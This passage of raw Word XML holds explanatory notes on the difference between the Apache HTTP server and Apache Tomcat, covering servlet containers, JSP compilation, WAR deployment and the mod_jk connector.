              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>Tomcat, on the other hand, is specifically designed from the ground-up to serve as a </w:t>
            </w:r>
            <w:hyperlink r:id="rId16" w:history="1">
              <w:r w:rsidRPr="00584E67">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="7F3A21"/>
                </w:rPr>
                <w:t>Java Servlet</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t xml:space="preserve"> engine. </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>It's</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t xml:space="preserve"> primary purpose is to implement the Java Servlet API and execute Java servlets for the purpose of building dynamic websites</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>. Tomcat can </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:i/>
                <w:iCs/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>also</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t xml:space="preserve"> be used as a regular HTTP server that serves static pages, but that is not its primary purpose. (Also, Tomcat is allegedly slower than Apache </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>httpd</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t xml:space="preserve"> when it comes to serving static pages.)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="75" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>The two technologies can be used together through a connector module called </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidR="009844C0" w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009844C0" w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:instrText>HYPERLINK "http://tomcat.apache.org/connectors-doc-archive/jk2/jk/aphowto.html"</w:instrText>
            </w:r>
            <w:r w:rsidR="009844C0" w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="7F3A21"/>
              </w:rPr>
              <w:t>mod_jk</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidR="009844C0" w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>. This will allow you to use the Apache HTTP server to serve regular static webpages, and the Tomcat Servlet engine to execute servlets.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="75" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="75" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>………..</w:t>
            </w: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 xml:space="preserve">The most prevalent use of the internet today is browsing. People all around the world find information by accessing data from other computers through their browser; but beyond that, people know very little. In order to communicate with the host computer, the browser would need to request pages from </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> http server that is run on the host computer. It would then be responsible for finding and providing you with the right pages.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="0"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An excellent and very popular web server around today is the Apache web server. It allows people who want to set-up their own web server to do so with very little trouble. Installing the Apache web server is the most basic thing you can do to support html and other related software.</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:br/>
              <w:t>The next step is to install more software that complements the web server like PHP or Tomcat.</w:t>
            </w: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 xml:space="preserve">Tomcat is another piece of software that is meant to enhance the usability and interactive experience </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>that users experience with your website. Because Tomcat is also a server and it is also made by Apache, it is usually confused with the web server made by Apache. Just keep in mind that although they are both servers that are meant for use in the Internet, they also have separate and distinct roles to play.</w:t>
            </w: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Tomcat is a server that is meant to run applications that were written in Java and JSP (Java Server Pages). Java and JSP applications are type of scripts that can create dynamic </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0">
                  <wp:extent cx="551697" cy="405388"/>
                  <wp:effectExtent l="19050" t="0" r="753" b="0"/>
                  <wp:docPr id="4" name="Picture 1" descr="tom-ca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cat-server"/>
                          <pic:cNvPicPr>
                            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                          </pic:cNvPicPr>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId17" cstate="print"/>
                          <a:srcRect/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="551717" cy="405403"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln w="9525">
                            <a:noFill/>
                            <a:miter lim="800000"/>
                            <a:headEnd/>
                            <a:tailEnd/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">pages much like PHP can. These scripts are then run on a Tomcat server where it can be accessed. It is open source software just like all the software created by Apache, and since it is open source it is also </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>free</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">. Tomcat offers a lot of advantages over its main competitor </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>JRun</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> one of which is hassle free installation; a lot of complaints have surfaced involving </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>JRun</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> installation.</w:t>
            </w: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If you are putting up a web server and you intend to have Java or JSP support on it, you might want to look at the offering that Apache has. The fact that they are made by the same group of people reduces the chances of encountering problem while operating scripts. Tomcat is currently the best at what it does and the Apache web server has also been recognized as a very competent and stable server to run. The features and stability alone are enough to sway anyone who wants to start their own servers, but the fact that both are free makes the offer irresistible.</w:t>
            </w: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p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:before="237" w:after="237" w:line="506" w:lineRule="atLeast"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>…</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="309" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">Apache Tomcat is used to deploy your Java Servlets and JSPs. So in your Java project you can build your WAR (short for Web </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ARchive</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>) file, and just drop it in the deploy directory in Tomcat.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="309" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>So basically Apache is an HTTP Server, serving HTTP. Tomcat is a Servlet and JSP Server serving Java technologies.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="309" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">Tomcat is a servlet container. A servlet, at the end, is a Java class. JSP files (which are similar to </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>PHP,</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> and older ASP files) are generated into Java code (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>HttpServlet</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">), which is then compiled to .class files </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>by the server and executed by the Java virtual machine.</w:t>
            </w:r>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblW w:w="0" w:type="auto"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:tblCellMar>
                <w:left w:w="0" w:type="dxa"/>
                <w:right w:w="0" w:type="dxa"/>
              </w:tblCellMar>
              <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
            </w:tblPr>
            <w:tblGrid>
              <w:gridCol w:w="257"/>
              <w:gridCol w:w="8872"/>
            </w:tblGrid>
            <w:tr w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidTr="004E3A7C">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:tcBorders>
                    <w:top w:val="nil"/>
                    <w:left w:val="nil"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                  <w:tcMar>
                    <w:top w:w="0" w:type="dxa"/>
                    <w:left w:w="0" w:type="dxa"/>
                    <w:bottom w:w="0" w:type="dxa"/>
                    <w:right w:w="251" w:type="dxa"/>
                  </w:tcMar>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
                  <w:pPr>
                    <w:spacing w:after="0" w:line="283" w:lineRule="atLeast"/>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="777777"/>
                      <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                    </w:rPr>
                    <w:br/>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:tcBorders>
                    <w:top w:val="nil"/>
                    <w:left w:val="nil"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00EC39D9">
                  <w:pPr>
                    <w:numPr>
                      <w:ilvl w:val="0"/>
                      <w:numId w:val="14"/>
                    </w:numPr>
                    <w:spacing w:after="120" w:line="240" w:lineRule="auto"/>
                    <w:ind w:left="502"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t>Apache is a general-purpose http server, which supports a number of advanced options that Tomcat doesn't.</w:t>
                  </w:r>
                </w:p>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00EC39D9">
                  <w:pPr>
                    <w:numPr>
                      <w:ilvl w:val="0"/>
                      <w:numId w:val="14"/>
                    </w:numPr>
                    <w:spacing w:after="84" w:line="240" w:lineRule="auto"/>
                    <w:ind w:left="502"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t>Although Tomcat can be used as a general purpose http server, you can also set up Apache and Tomcat to work together with Apache serving static content and forwarding the requests for dynamic content to Tomcat.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="327" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Tomcat is primarily an application server, which serves requests to custom-built Java servlets or JSP files on your server. It is usually used in conjunction with the Apache HTTP server (at least in my experience). Use it to manually process incoming requests.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="327" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>The HTTP server, by itself, is best for serving up static content... html files, images, etc.</w:t>
            </w:r>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblW w:w="0" w:type="auto"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:tblCellMar>
                <w:left w:w="0" w:type="dxa"/>
                <w:right w:w="0" w:type="dxa"/>
              </w:tblCellMar>
              <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
            </w:tblPr>
            <w:tblGrid>
              <w:gridCol w:w="257"/>
              <w:gridCol w:w="8872"/>
            </w:tblGrid>
            <w:tr w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidTr="004E3A7C">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:tcBorders>
                    <w:top w:val="nil"/>
                    <w:left w:val="nil"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                  <w:tcMar>
                    <w:top w:w="0" w:type="dxa"/>
                    <w:left w:w="0" w:type="dxa"/>
                    <w:bottom w:w="0" w:type="dxa"/>
                    <w:right w:w="251" w:type="dxa"/>
                  </w:tcMar>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
                  <w:pPr>
                    <w:spacing w:after="0" w:line="283" w:lineRule="atLeast"/>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:tcBorders>
                    <w:top w:val="nil"/>
                    <w:left w:val="nil"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
                  <w:pPr>
                    <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t xml:space="preserve">If you are using java </w:t>
                  </w:r>
                  <w:proofErr w:type="gramStart"/>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t>technology(</w:t>
                  </w:r>
                  <w:proofErr w:type="gramEnd"/>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t xml:space="preserve">Servlet/JSP) for making web application you will probably use Apache Tomcat. However, if you are using other technologies like Perl, PHP or ruby, its </w:t>
                  </w:r>
                  <w:proofErr w:type="gramStart"/>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t>better(</w:t>
                  </w:r>
                  <w:proofErr w:type="gramEnd"/>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t>easier) to use Apache HTTP Server.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
